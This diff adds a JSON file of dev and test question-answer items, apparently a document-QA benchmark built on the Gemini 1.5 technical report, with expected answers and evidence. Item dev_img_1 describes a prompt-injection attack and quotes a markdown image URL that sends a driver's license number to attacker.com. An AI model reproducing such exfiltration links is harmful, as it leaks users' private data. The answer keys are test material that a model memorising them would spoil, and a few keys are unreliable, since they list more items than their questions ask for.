@@ -1,0 +1,473 @@
+{
+  "dev": [
+    {
+      "id": "dev_table_1",
+      "category": "table",
+      "question": "According to Table 2 on page 3, what is Gemini 1.5 Flash's win-rate relative to Gemini 1.0 Ultra on Vision benchmarks (both percentage and benchmark ratio)?",
+      "expected_answer": "61.9% (13/21 benchmarks).",
+      "evidence": "Table 2 (p.3), row 'Vision', column 'Relative to 1.0 Ultra': Win-rate: 61.9% (13/21 benchmarks).",
+      "pages": [
+        3
+      ]
+    },
+    {
+      "id": "dev_table_2",
+      "category": "table",
+      "question": "In Table 18 on page 39, which model achieves the highest score on DUDE (test), and what is its score?",
+      "expected_answer": "Gemini 1.5 Flash with 48% (compared to 46% for Gemini 1.5 Pro, 44% for 1.0 Ultra, and 39% for 1.0 Pro).",
+      "evidence": "Table 18 (p.39), row 'DUDE (test)': 1.0 Pro 39%, 1.0 Ultra 44%, 1.5 Flash 48% (bold blue), 1.5 Pro 46%.",
+      "pages": [
+        39
+      ]
+    },
+    {
+      "id": "dev_table_3",
+      "category": "table",
+      "question": "According to Table 21 on page 43, what are the single-greedy-decoding and rm@256 scores of Math-Specialized Gemini 1.5 Pro on AIME 2024?",
+      "expected_answer": "7/30 (single greedy decoding) and 8/30 (rm@256).",
+      "evidence": "Table 21 (p.43), row 'AIME 2024', column 'Math-Specialized 1.5 Pro': 7/30 and 8/30 rm@256.",
+      "pages": [
+        43
+      ]
+    },
+    {
+      "id": "dev_img_1",
+      "category": "image_diagram",
+      "question": "In Figure 23 on page 61, what sensitive value from the conversation history is exfiltrated in the successful prompt injection attack, and to what URL parameter?",
+      "expected_answer": "The user's driver's license number K1455236, exfiltrated via the markdown image URL parameter `param=K1455236` (`https://attacker.com/img.jpg?param=K1455236`).",
+      "evidence": "Figure 23 (p.61), steps (2)-(4): driver's license number K1455236 embedded in `![resort](https://attacker.com/img.jpg?param=K1455236)`.",
+      "pages": [
+        61
+      ]
+    },
+    {
+      "id": "dev_img_2",
+      "category": "image_diagram",
+      "question": "In Figure 31 on page 149 (BetterChartQA examples), in which step of the Flowchart example does 'Build MySQL based relational database' occur, and what is the Ground truth peak location in the Scatter plot example?",
+      "expected_answer": "In the Flowchart example it occurs in the 'Preprocessing Step'; in the Scatter plot example the Ground truth is option 'a' corresponding to (0.1, 1.5).",
+      "evidence": "Figure 31 (p.149): middle panel 'Scatter plot' Ground truth: a ((0.1, 1.5)); right panel 'Flowchart' Ground truth: Preprocessing Step.",
+      "pages": [
+        149
+      ]
+    },
+    {
+      "id": "dev_chart_1",
+      "category": "chart",
+      "question": "In Figure 10 (Audio Haystack) on page 14, up to how many hours of audio does Gemini 1.5 Pro achieve 100% green recall (zero red cells), and what are the tick marks on the Minutes axis of the 'Up to 107 hours' panel?",
+      "expected_answer": "Up to 107 hours with zero red cells; the Minutes axis ticks are 640, 1920, 3200, 4480, and 5760.",
+      "evidence": "Figure 10 (p.14), top-right panel 'Up to 107 hours': all cells green, x-axis ticks 640, 1920, 3200, 4480, 5760 Minutes.",
+      "pages": [
+        14
+      ]
+    },
+    {
+      "id": "dev_chart_2",
+      "category": "chart",
+      "question": "In Figure 13 on page 20, what is the maximum Number of Shots (K) shown on the x-axis for the top-row Flores plots vs. the bottom-row In-house plots?",
+      "expected_answer": "2^10 (~1K shots) for the top-row Flores sets, and 2^12 (~4K shots) for the bottom-row in-house sets.",
+      "evidence": "Figure 13 (p.20): top plots x-axis ends at 2^10 (~1K shots in caption); bottom plots x-axis ends at 2^12 (~4K shots in caption).",
+      "pages": [
+        20
+      ]
+    },
+    {
+      "id": "dev_chart_3",
+      "category": "chart",
+      "question": "In Figure 19 on page 38, which two industries show the highest percent time saved for Gemini 1.5 Pro, and what are their values?",
+      "expected_answer": "Programming (0.75) and Photography (0.73).",
+      "evidence": "Figure 19 (p.38): green bars (Gemini 1.5 Pro) peak at Programming (0.75) and Photography (0.73).",
+      "pages": [
+        38
+      ]
+    },
+    {
+      "id": "dev_multi_1",
+      "category": "multi_hop",
+      "question": "Compare Gemini 1.5 Pro's accuracy on 1H-VideoQA (all frames / 1 fps) in Table 9 (p.25) with its Audio Haystack recall at 107 hours in Figure 10 (p.14).",
+      "expected_answer": "On 1H-VideoQA with full video (1 fps) Gemini 1.5 Pro achieves 72.2% accuracy (Table 9, p.25), whereas on Audio Haystack up to 107 hours it achieves 100% green needle recall (Figure 10, p.14).",
+      "evidence": "Table 9 (p.25) gives 72.2% at full video (1 fps); Figure 10 (p.14) shows all green cells up to 107 hours.",
+      "pages": [
+        14,
+        25
+      ]
+    },
+    {
+      "id": "dev_multi_2",
+      "category": "multi_hop",
+      "question": "Using Table 20 on page 42, which model achieves the best score on YouTube (52 lang) WER, and by how many percentage points does it outperform Whisper (v3)?",
+      "expected_answer": "Gemini 1.0 Ultra achieves the best WER at 21.0%, outperforming Whisper (v3) at 41.4% by 20.4 percentage points.",
+      "evidence": "Table 20 (p.42), row 'YouTube (52 lang)': Gemini 1.0 Ultra 21.0%, Whisper 41.4% (v3); 41.4 - 21.0 = 20.4.",
+      "pages": [
+        42
+      ]
+    },
+    {
+      "id": "dev_multi_3",
+      "category": "multi_hop",
+      "question": "From Figure 26 on page 65, what is Gemini 1.0 Ultra's Bias score on BBQ (4-shot) for Age in the ambiguous split, and what is Gemini 1.5 Pro's corresponding Bias score and Accuracy on that same cell?",
+      "expected_answer": "Gemini 1.0 Ultra has Bias score 27.5 on ambiguous Age, while Gemini 1.5 Pro has Bias score 0.38 and Accuracy 1.0.",
+      "evidence": "Figure 26 (p.65), panel (a) ambiguous Age: 1.0 Ultra = 27.5, 1.5 Pro = 0.38; panel (b) ambiguous Age: 1.5 Pro = 1.0.",
+      "pages": [
+        65
+      ]
+    },
+    {
+      "id": "dev_text_1",
+      "category": "text",
+      "question": "According to page 2, what are the exact context token lengths (and corresponding hours/words) where Gemini 1.5 Pro maintains >99.7% needle recall across text, audio, and video?",
+      "expected_answer": "10M tokens in text (~7M words), 9.7M tokens in audio (up to 107 hours), and 9.9M tokens in video (up to 10.5 hours).",
+      "evidence": "Page 2 (Figure 1 caption): 10M tokens text (~7M words), 9.7M tokens audio (up to 107 hours), 9.9M tokens video (up to 10.5 hours).",
+      "pages": [
+        2
+      ]
+    },
+    {
+      "id": "dev_text_2",
+      "category": "text",
+      "question": "According to Section 3.2 on page 6, how is Gemini 1.5 Flash trained from Gemini 1.5 Pro to achieve lower latency while maintaining quality?",
+      "expected_answer": "It uses parallel computation of attention and feedforward components, is online distilled from Gemini 1.5 Pro, and is trained with higher-order preconditioned methods.",
+      "evidence": "Page 6, Section 3.2: parallel computation of attention and feedforward components, online distilled from Gemini 1.5 Pro, higher-order preconditioned methods.",
+      "pages": [
+        6
+      ]
+    },
+    {
+      "id": "dev_text_3",
+      "category": "text",
+      "question": "According to Section 4 on page 7, what hardware accelerators are used to train Gemini 1.5 models?",
+      "expected_answer": "Multiple 4096-chip pods of Google's TPUv4 accelerators distributed across multiple datacenters.",
+      "evidence": "Page 7, Section 4: 'multiple 4096-chip pods of Google’s TPUv4 accelerators, distributed across multiple datacenters'.",
+      "pages": [
+        7
+      ]
+    },
+    {
+      "id": "dev_text_4",
+      "category": "text",
+      "question": "According to Section 8 on page 45, what three large-scale deployment use cases are highlighted for Gemini 1.5 Flash-8B?",
+      "expected_answer": "Large-Scale Data Labeling, High-Throughput Agent Serving, and Model Integration in Complex Workflows.",
+      "evidence": "Page 45, Section 8 bullet list: Large-Scale Data Labeling, High-Throughput Agent Serving, Model Integration in Complex Workflows.",
+      "pages": [
+        45
+      ]
+    },
+    {
+      "id": "dev_unans_1",
+      "category": "unanswerable",
+      "question": "What is the exact total parameter count (in billions) of Gemini 1.5 Pro reported in the paper?",
+      "expected_answer": "Abstain: the report does not disclose the parameter count of Gemini 1.5 Pro.",
+      "evidence": "Verified absent across all 154 pages ('billion parameters' / 'trillion parameters' = 0 hits).",
+      "pages": []
+    },
+    {
+      "id": "dev_unans_2",
+      "category": "unanswerable",
+      "question": "What score does Gemini 1.5 Pro achieve on the SWE-bench Verified benchmark in this report?",
+      "expected_answer": "Abstain: SWE-bench Verified is not evaluated or mentioned in the report.",
+      "evidence": "Verified absent across all 154 pages ('SWE-bench' = 0 hits).",
+      "pages": []
+    },
+    {
+      "id": "dev_unans_3",
+      "category": "unanswerable",
+      "question": "What optimizer and peak learning rate schedule were used to pre-train Gemini 1.5 Flash?",
+      "expected_answer": "Abstain: optimizer hyperparameters and learning rate schedules are not reported.",
+      "evidence": "Verified absent across all 154 pages ('learning rate' = 0 hits, 'AdamW' = 0 hits).",
+      "pages": []
+    }
+  ],
+  "test": [
+    {
+      "id": "test_table_1",
+      "category": "table",
+      "question": "According to Table 1 on page 3, what is Gemini 1.5 Pro's win-rate relative to Gemini 1.0 Ultra on Core Capabilities and on Vision benchmarks?",
+      "expected_answer": "Core Capabilities: 77.8% (35/45 benchmarks); Vision: 85.7% (18/21 benchmarks).",
+      "evidence": "Table 1 (p.3), column 'Relative to 1.0 Ultra': Core Capabilities 77.8% (35/45 benchmarks); Vision 85.7% (18/21 benchmarks).",
+      "pages": [
+        3
+      ]
+    },
+    {
+      "id": "test_table_2",
+      "category": "table",
+      "question": "In Table 3 on page 6, what is the time per output character (ms) for Japanese across Gemini 1.5 Flash, Gemini 1.5 Pro, and GPT-4 Turbo?",
+      "expected_answer": "Gemini 1.5 Flash: 4.3 ms, Gemini 1.5 Pro: 10.9 ms, GPT-4 Turbo: 35.4 ms.",
+      "evidence": "Table 3 (p.6), row 'Japanese': 4.3, 10.9, 35.4 ms.",
+      "pages": [
+        6
+      ]
+    },
+    {
+      "id": "test_table_3",
+      "category": "table",
+      "question": "According to Table 4 on page 18, what are Gemini 1.5 Pro's human evaluation score and BLEURT score (in parentheses) for Kalamang->English translation in the 'full book' context setting?",
+      "expected_answer": "Human evaluation score: 4.00; BLEURT score: 64.6.",
+      "evidence": "Table 4 (p.18), row 'full book', column 'Gemini 1.5 Pro': 4.00 (64.6).",
+      "pages": [
+        18
+      ]
+    },
+    {
+      "id": "test_table_4",
+      "category": "table",
+      "question": "In Table 8 on page 23, what Word Error Rate (WER) does Gemini 1.5 Pro achieve on 15-minute videos without segmentation, and how does that compare to Whisper with 30s segmentation?",
+      "expected_answer": "Gemini 1.5 Pro achieves 5.5% WER without segmentation, which is lower (better) than Whisper with 30s segmentation at 7.3% WER.",
+      "evidence": "Table 8 (p.23): Gemini 1.5 Pro (no segmentation) = 5.5% WER; Whisper (30s segmentation) = 7.3% WER.",
+      "pages": [
+        23
+      ]
+    },
+    {
+      "id": "test_table_5",
+      "category": "table",
+      "question": "According to Table 9 on page 25, what are the 1H-VideoQA accuracies of GPT-4V, Gemini 1.5 Flash, and Gemini 1.5 Pro when sampling 150 frames?",
+      "expected_answer": "GPT-4V: 52.3%, Gemini 1.5 Flash: 50.8%, Gemini 1.5 Pro: 56.3%.",
+      "evidence": "Table 9 (p.25), column '150' frames: GPT-4V 52.3%, Gemini 1.5 Pro 56.3%, Gemini 1.5 Flash 50.8%.",
+      "pages": [
+        25
+      ]
+    },
+    {
+      "id": "test_table_6",
+      "category": "table",
+      "question": "In Table 12 on page 33 (Berkeley Function Calling Leaderboard), what is Gemini 1.5 Pro's Weighted Average score, and on which single task split does Gemini 1.5 Flash outperform Gemini 1.5 Pro?",
+      "expected_answer": "Gemini 1.5 Pro's Weighted Average is 88.4%; Gemini 1.5 Flash outperforms Gemini 1.5 Pro on 'Multiple Functions' (92.0% vs. 90.5%).",
+      "evidence": "Table 12 (p.33): Weighted Average 1.5 Pro = 88.4%; Multiple Functions 1.5 Flash = 92.0% vs 1.5 Pro = 90.5%.",
+      "pages": [
+        33
+      ]
+    },
+    {
+      "id": "test_img_1",
+      "category": "image_diagram",
+      "question": "In Figure 3 on page 8, how many tokens and files are in the JAX Core Codebase prompt, and what file path and Python function definition does Gemini 1.5 Pro output for autodifferentiation's backward pass?",
+      "expected_answer": "746,152 tokens across 116 files; output file is `jax/_src/interpreters/ad.py` and function `def backward_pass(...)`.",
+      "evidence": "Figure 3 (p.8): 'Tokens: 746,152 tokens / Total files: 116', output `jax/_src/interpreters/ad.py` and `def backward_pass(...)`.",
+      "pages": [
+        8
+      ]
+    },
+    {
+      "id": "test_img_2",
+      "category": "image_diagram",
+      "question": "In Figure 4 on page 8, what two reference materials (and total token count) are provided in the Long context box, and what English sentence is translated into Kalamang?",
+      "expected_answer": "A Grammar book + Dictionary totaling 250K tokens; the sentence is 'I'm getting pandanus, I want to make a mat.' (translated as 'An padanual repte, irar paruotkin.').",
+      "evidence": "Figure 4 (p.8): 'Grammar book + Dictionary (250K tokens)', prompt \"I'm getting pandanus, I want to make a mat.\", output 'An padanual repte, irar paruotkin.'.",
+      "pages": [
+        8
+      ]
+    },
+    {
+      "id": "test_img_3",
+      "category": "image_diagram",
+      "question": "In Figure 5 on page 8, what object is shown in the hand-drawn stick-figure sketch in the user prompt, and what page number and highlighted phrase does Gemini 1.5 Pro identify in Les Miserables?",
+      "expected_answer": "Two silver candlesticks (a stick figure holding two lit candlesticks); Page 119 and the highlighted phrase 'took the two silver candlesticks'.",
+      "evidence": "Figure 5 (p.8): sketch of two lit candlesticks, output 'Page 119' and highlighted 'took the two silver candlesticks'.",
+      "pages": [
+        8
+      ]
+    },
+    {
+      "id": "test_img_4",
+      "category": "image_diagram",
+      "question": "In Figure 28 on page 110 (the AlphaGo documentary video needle frame), what secret word is overlaid at the top of the frame, what match date range is printed on the backdrop, and what subtitle appears at the bottom?",
+      "expected_answer": "Secret word: 'needle' (\"The secret word is \\\"needle\\\".\"); match dates: '8 - 15 March 2016'; subtitle: 'This move was really creative and beautiful.'",
+      "evidence": "Figure 28 (p.110): top overlay `The secret word is \"needle\".`, backdrop `8 - 15 March 2016`, subtitle `This move was really creative and beautiful.`.",
+      "pages": [
+        110
+      ]
+    },
+    {
+      "id": "test_img_5",
+      "category": "image_diagram",
+      "question": "In Figure 30 on page 139, what are the three sub-diagram labels in the middle 'Sub-Figure' panel, and what organism name appears in the 'Full Figure' panel?",
+      "expected_answer": "Middle 'Sub-Figure' labels: AzF, CMF, and AcK; 'Full Figure' organism: Burkholderia thailandensis E264 (and Burkholderia sp. FERM BP-3421).",
+      "evidence": "Figure 30 (p.139): middle panel shows AzF, CMF, AcK; right panel shows Burkholderia thailandensis E264 and Burkholderia sp. FERM BP-3421.",
+      "pages": [
+        139
+      ]
+    },
+    {
+      "id": "test_chart_1",
+      "category": "chart",
+      "question": "In Figure 2 on page 5, which benchmark shows the largest score improvement (+23.7) for Gemini 1.5 Pro from Feb 2024 to May 2024, and what are its Feb and May scores?",
+      "expected_answer": "V* Bench, improving by +23.7 from 48.0 (Feb 2024) to 71.7 (May 2024).",
+      "evidence": "Figure 2 (p.5): V* Bench bar shows 48.0 (Feb 2024) and 71.7 (+23.7) (May 2024).",
+      "pages": [
+        5
+      ]
+    },
+    {
+      "id": "test_chart_2",
+      "category": "chart",
+      "question": "In Figure 8 (Text Haystack) on page 12, what do the green, gray, and red cells represent, and up to what maximum context length does GPT-4 Turbo show non-error results?",
+      "expected_answer": "Green = model successfully retrieved the secret number; gray = API errors; red = model response did not contain the secret number. GPT-4 Turbo only operates up to 128k tokens (all cells beyond 128k are gray API errors).",
+      "evidence": "Figure 8 (p.12) heatmap + caption: green=retrieved, gray=API errors, red=missed; GPT-4 Turbo stops at 128k tokens.",
+      "pages": [
+        12
+      ]
+    },
+    {
+      "id": "test_chart_3",
+      "category": "chart",
+      "question": "In Figure 14 on page 22 (Bradley-Terry Strength scores), what is the Strength score of 'full 710k context Gemini 1.5 Pro' compared to 'RAG 4k context Gemini 1.5 Pro' and '0k context GPT-4 Turbo'?",
+      "expected_answer": "full 710k context Gemini 1.5 Pro: 6.2417; RAG 4k context Gemini 1.5 Pro: 1.7656; 0k context GPT-4 Turbo: 1.6424.",
+      "evidence": "Figure 14 (p.22) bar labels: 6.2417, 1.7656, and 1.6424.",
+      "pages": [
+        22
+      ]
+    },
+    {
+      "id": "test_chart_4",
+      "category": "chart",
+      "question": "In Figure 15 on page 24, what are Gemini 1.5 Pro's accuracies on EgoSchema (3 minutes) across 'First frame', '16 frames', and '150 frames'?",
+      "expected_answer": "First frame: 0.536; 16 frames: 0.702; 150 frames: 0.727.",
+      "evidence": "Figure 15 (p.24), EgoSchema bars: 0.536, 0.702, 0.727.",
+      "pages": [
+        24
+      ]
+    },
+    {
+      "id": "test_chart_5",
+      "category": "chart",
+      "question": "In Figure 32 on page 154 (BetterChartQA by-capability performance), which capability category shows Gemini 1.5 Pro exceeding 80% accuracy, and which model outperforms Gemini 1.5 Pro on the 'other (37)' category?",
+      "expected_answer": "'table (29)' is the category where Gemini 1.5 Pro exceeds 80% accuracy; 'GPT-4 Turbo' outperforms Gemini 1.5 Pro on 'other (37)'.",
+      "evidence": "Figure 32 (p.154): blue bar (Gemini 1.5 Pro) > 80% only at 'table (29)'; gray bar (GPT-4 Turbo) is longest at 'other (37)'.",
+      "pages": [
+        154
+      ]
+    },
+    {
+      "id": "test_multi_1",
+      "category": "multi_hop",
+      "question": "Compare the MATH score of Gemini 1.5 Pro (May 2024) in Figure 2 (p.5) with the Math-Specialized Gemini 1.5 Pro single-sample MATH score in Table 21 (p.43): what is the difference in percentage points?",
+      "expected_answer": "Gemini 1.5 Pro (May 2024) is 67.7% (Figure 2, p.5) and Math-Specialized 1.5 Pro is 80.6% (Table 21, p.43), a difference of 12.9 percentage points.",
+      "evidence": "Figure 2 (p.5) MATH = 67.7; Table 21 (p.43) Math-Specialized 1.5 Pro MATH = 80.6; 80.6 - 67.7 = 12.9.",
+      "pages": [
+        5,
+        43
+      ]
+    },
+    {
+      "id": "test_multi_2",
+      "category": "multi_hop",
+      "question": "Using Table 3 (p.6) and Section 3.3 (p.6), how many queries were averaged to measure time per output character, and how many times faster is Gemini 1.5 Flash than GPT-4 Turbo on Chinese?",
+      "expected_answer": "32 queries were used (reporting the minimum of mean time per output character across 32 requests); on Chinese, Gemini 1.5 Flash is 5.2 ms vs. GPT-4 Turbo 53.4 ms (~10.27x faster).",
+      "evidence": "Section 3.3 + Table 3 (p.6): 32 queries; Chinese Flash 5.2 ms vs GPT-4 Turbo 53.4 ms (53.4 / 5.2 = 10.27).",
+      "pages": [
+        6
+      ]
+    },
+    {
+      "id": "test_multi_3",
+      "category": "multi_hop",
+      "question": "From Figure 17 (p.28), how many images are given in the unstructured data analytics task, and what happens to GPT-4 Turbo 20240409's accuracy when Batch Size increases from 128 to 256 (and why does its curve stop at 256)?",
+      "expected_answer": "1024 images are given; GPT-4 Turbo 20240409 drops sharply from ~33% at batch size 128 to ~23% at batch size 256 and cannot run at batch size 512 due to context length limits.",
+      "evidence": "Figure 17 + prose (p.28): 1024 images; GPT-4 Turbo 20240409 line drops between batch size 128 and 256 and stops at 256.",
+      "pages": [
+        28
+      ]
+    },
+    {
+      "id": "test_multi_4",
+      "category": "multi_hop",
+      "question": "In Figure 27 (p.108, multiple needles-in-haystack), compare the trend lines of Gemini 1.5 Pro vs. GPT-4 Turbo from 1K to 128K context tokens for # needles = 50 and # needles = 100.",
+      "expected_answer": "In both # needles = 50 and # needles = 100 (top panels), Gemini 1.5 Pro maintains higher recall (~0.75-0.85 at 50 needles and ~0.65-0.85 at 100 needles) with a gentler slope as context grows to 128K, while GPT-4 Turbo degrades much faster (dropping to ~0.5 at 50 needles and ~0.35 at 100 needles by 128K).",
+      "evidence": "Figure 27 (p.108), top two regression plots (# needles = 50 and # needles = 100, 1K to 128K).",
+      "pages": [
+        108
+      ]
+    },
+    {
+      "id": "test_text_1",
+      "category": "text",
+      "question": "According to page 6, what three real-world long-context examples can Gemini 1.5 Pro comfortably process within its context window (give the book, codebase, and video examples with their sizes)?",
+      "expected_answer": "107 hours of audio (~5 days), the entire 1440-page book 'War and Peace' (587,287 words), the entire Flax codebase (41,070 lines of code), or 10.5 hours of video at 1 fps.",
+      "evidence": "Page 6 top paragraph: 107 hours audio, 1440-page 'War and Peace' (587,287 words), Flax codebase (41,070 lines), 10.5 hours video at 1 fps.",
+      "pages": [
+        6
+      ]
+    },
+    {
+      "id": "test_text_2",
+      "category": "text",
+      "question": "According to Section 5 on page 7, what are the three main evaluation categories used for Gemini 1.5?",
+      "expected_answer": "1. Qualitative long-context multimodal evaluations; 2. Quantitative long-context evaluations (or synthetic & real-world long-context tasks); 3. Core benchmarks (covering Gemini 1.0 capabilities).",
+      "evidence": "Page 7-8, Section 5 numbered list of 3 evaluation categories.",
+      "pages": [
+        7,
+        8
+      ]
+    },
+    {
+      "id": "test_text_3",
+      "category": "text",
+      "question": "According to Section 7 on page 43, what four competition-derived or internal math benchmarks are used to evaluate the math-specialized Gemini 1.5 Pro, and how is the 91.1% MATH score obtained without external tools?",
+      "expected_answer": "MATH, AIME 2024, MathOdyssey, HiddenMath, and IMO-Bench; 91.1% on MATH is obtained by sampling 256 solutions and selecting a candidate answer (rm@256) without code execution, theorem provers, or Google Search.",
+      "evidence": "Page 43, Section 7: MATH, AIME 2024, MathOdyssey, HiddenMath, IMO-Bench; 91.1% via rm@256 without external tools.",
+      "pages": [
+        43
+      ]
+    },
+    {
+      "id": "test_text_4",
+      "category": "text",
+      "question": "According to page 22 (Section 5.2.2.4 / Bradley-Terry analysis), with what probability does full-context Gemini 1.5 Pro (using the entire 'Les Miserables' book) provide a better answer than 4k-RAG Gemini 1.5 Pro and 4k-RAG GPT-4 Turbo?",
+      "expected_answer": "78% of cases (0.7795) vs. 4k-RAG Gemini 1.5 Pro, and 83% of cases vs. 4k-RAG GPT-4 Turbo.",
+      "evidence": "Page 22-23 text: P = 6.2417 / (6.2417 + 1.7656) = 0.7795 (78% of cases), and 83% vs retrieval-augmented GPT4-Turbo with 4k tokens.",
+      "pages": [
+        23
+      ]
+    },
+    {
+      "id": "test_unans_1",
+      "category": "unanswerable",
+      "question": "What is Gemini 1.5 Pro's score on the MMLU-Pro benchmark in this report?",
+      "expected_answer": "Abstain: MMLU-Pro is not evaluated or mentioned in the report.",
+      "evidence": "Verified absent across all 154 pages ('MMLU-Pro' = 0 hits).",
+      "pages": []
+    },
+    {
+      "id": "test_unans_2",
+      "category": "unanswerable",
+      "question": "How many total pre-training FLOPs were used to train Gemini 1.5 Pro?",
+      "expected_answer": "Abstain: pre-training FLOPs are not disclosed in the report.",
+      "evidence": "Verified absent across all 154 pages ('FLOP' = 0 hits).",
+      "pages": []
+    },
+    {
+      "id": "test_unans_3",
+      "category": "unanswerable",
+      "question": "What is the API pricing per million input and output tokens for Gemini 1.5 Flash and Gemini 1.5 Pro reported in this paper?",
+      "expected_answer": "Abstain: API token pricing is not reported in the paper.",
+      "evidence": "Verified absent across all 154 pages ('pricing' = 0 hits).",
+      "pages": []
+    },
+    {
+      "id": "test_unans_4",
+      "category": "unanswerable",
+      "question": "What are the total carbon emissions (in tCO2e) from training Gemini 1.5 Pro?",
+      "expected_answer": "Abstain: training carbon emissions (tCO2e) are not reported.",
+      "evidence": "Verified absent across all 154 pages ('tCO2e' = 0 hits).",
+      "pages": []
+    },
+    {
+      "id": "test_unans_5",
+      "category": "unanswerable",
+      "question": "According to Table 9 on page 25, what exact accuracy percentage did GPT-4V achieve on 1H-VideoQA when given the full video at 1 fps?",
+      "expected_answer": "Abstain: Table 9 explicitly states 'Not supported' for GPT-4V on full video (1 fps), so no accuracy percentage exists.",
+      "evidence": "Table 9 (p.25), row 'GPT-4V', column 'full video (1 fps)': 'Not supported'.",
+      "pages": [
+        25
+      ]
+    },
+    {
+      "id": "test_unans_6",
+      "category": "unanswerable",
+      "question": "How does Gemini 1.5 Pro compare against Llama 3 70B and Claude 3.5 Sonnet in this technical report?",
+      "expected_answer": "Abstain: neither Llama 3 nor Claude 3.5 Sonnet appears in this technical report.",
+      "evidence": "Verified absent across all 154 pages ('Llama 3' = 0 hits, 'Claude 3.5' = 0 hits).",
+      "pages": []
+    }
+  ]
+}
